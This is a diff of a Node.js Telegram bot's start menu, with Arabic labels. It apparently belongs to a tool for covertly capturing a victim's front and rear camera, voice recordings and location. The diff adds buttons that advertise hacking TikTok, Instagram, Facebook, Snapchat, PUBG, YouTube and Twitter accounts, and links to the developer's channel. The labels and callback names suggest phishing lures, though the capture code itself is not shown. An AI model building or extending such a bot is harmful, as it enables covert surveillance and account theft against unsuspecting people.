@@ -241,10 +241,18 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كام أمامي', callback_data:'front_camera' }],
-                [{ text: 'تصوير كام خلفي', callback_data:'rear_camera' }],
+                [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
                 [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
-                [{ text: 'الحصول على الموقع', callback_data:'get_location' }]
+                [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
+                [{ text: '☠️اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
+                [{ text: '🕷اختراق الانستغرام🕷', callback_data: 'increase_instagram' }],
+                [{ text: '🔱اختراق الفيسبوك🔱', callback_data: 'increase_facebook' }],
+                [{ text: ' 👻 اختراق سناب شات 👻 ', callback_data: 'increase_snapchat' }],
+                [{ text: '🔫اختراق حسابات ببجي🔫', callback_data: 'pubg_uc' }],
+                [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
+                [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
+                [{ text: 'قناة المطور', url: 'https://t.me/SJGDDW' }],
+                [{ text: 'تواصل مع المطور', url: 'https://t.me/SAGD112' }]
             ]
         }
     });
@@ -292,3 +300,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
+
